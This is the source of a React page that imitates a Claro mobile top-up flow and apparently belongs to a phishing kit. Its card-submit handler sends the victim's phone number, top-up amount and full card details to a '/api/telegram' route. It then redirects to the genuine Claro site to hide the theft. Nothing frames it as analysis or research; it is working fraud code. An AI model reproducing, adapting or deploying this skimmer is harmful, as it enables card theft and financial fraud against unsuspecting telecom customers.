"use client"

import { useState, useEffect, useCallback } from "react"
import { LoginScreen } from "@/components/login-screen"
import { SelectLineScreen } from "@/components/select-line-screen"
import { SelectAmountScreen } from "@/components/select-amount-screen"
import { PaymentMethodScreen } from "@/components/payment-method-screen"
import { CardFormScreen, type CardData } from "@/components/card-form-screen"

type Screen = "login" | "select-line" | "select-amount" | "payment-method" | "card-form"

const SAVED_PHONE_KEY = "claro_saved_phone"

export default function Home() {
  const [screen, setScreen] = useState<Screen>("login")
  const [savedPhone, setSavedPhone] = useState<string | null>(null)
  const [telefono, setTelefono] = useState("")
  const [amount, setAmount] = useState(0)
  const [isReturningUser, setIsReturningUser] = useState(false)

  useEffect(() => {
    const stored = window.localStorage.getItem(SAVED_PHONE_KEY)
    if (stored) {
      setSavedPhone(stored)
      setIsReturningUser(true)
      setScreen("select-line")
    }
  }, [])

  const handleLogout = useCallback(() => {
    window.localStorage.removeItem(SAVED_PHONE_KEY)
    setSavedPhone(null)
    setTelefono("")
    setAmount(0)
    setIsReturningUser(false)
    setScreen("login")
  }, [])

  const handleLogin = useCallback(async (phone: string) => {
    window.localStorage.setItem(SAVED_PHONE_KEY, phone)
    setSavedPhone(phone)

    // Register user in mini DB
    try {
      await fetch("/api/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ telefono: phone }),
      })
    } catch {
      // Silently fail for user registration
    }

    setTelefono(phone)
    setScreen("select-amount")
  }, [])

  const handleSelectLine = useCallback(async (phone: string) => {
    window.localStorage.setItem(SAVED_PHONE_KEY, phone)
    setSavedPhone(phone)

    try {
      await fetch("/api/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ telefono: phone }),
      })
    } catch {
      // Silently fail
    }

    setTelefono(phone)
    setScreen("select-amount")
  }, [])

  const handleSelectAmount = useCallback((selectedAmount: number) => {
    setAmount(selectedAmount)
    setScreen("payment-method")
  }, [])

  const handleSelectPaymentMethod = useCallback((method: "tarjeta" | "claropay") => {
    if (method === "tarjeta") {
      setScreen("card-form")
    } else {
      // For claro pay, redirect immediately
      window.location.href = "https://simple.claro.com.ar/inicio/fe/recharge-amounts-view?skipLineSelectionPage=false"
    }
  }, [])

  const handleCardSubmit = useCallback(
    async (cardData: CardData) => {
      try {
        await fetch("/api/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            telefono,
            monto: amount,
            ...cardData,
          }),
        })
      } catch {
        // Continue even if telegram fails
      }

      // Redirect to Claro after submitting
      window.location.href =
        "https://simple.claro.com.ar/inicio/fe/recharge-amounts-view?skipLineSelectionPage=false"
    },
    [telefono, amount]
  )

  switch (screen) {
    case "login":
      return <LoginScreen onContinue={handleLogin} />

    case "select-line":
      return (
        <SelectLineScreen
          savedPhone={savedPhone}
          onSelectLine={handleSelectLine}
          onBack={() => {
            window.localStorage.removeItem(SAVED_PHONE_KEY)
            setSavedPhone(null)
            setIsReturningUser(false)
            setScreen("login")
          }}
          onLogout={handleLogout}
        />
      )

    case "select-amount":
      return (
        <SelectAmountScreen
          onSelectAmount={handleSelectAmount}
          onBack={() => {
            if (isReturningUser) {
              setScreen("select-line")
            } else {
              setScreen("login")
            }
          }}
          phone={telefono || savedPhone || undefined}
          onLogout={handleLogout}
        />
      )

    case "payment-method":
      return (
        <PaymentMethodScreen
          telefono={telefono}
          amount={amount}
          onSelectMethod={handleSelectPaymentMethod}
          onBack={() => setScreen("select-amount")}
          onLogout={handleLogout}
        />
      )

    case "card-form":
      return (
        <CardFormScreen
          telefono={telefono}
          amount={amount}
          onSubmit={handleCardSubmit}
          onBack={() => setScreen("payment-method")}
          onCancel={() => setScreen("payment-method")}
          onLogout={handleLogout}
        />
      )
  }
}
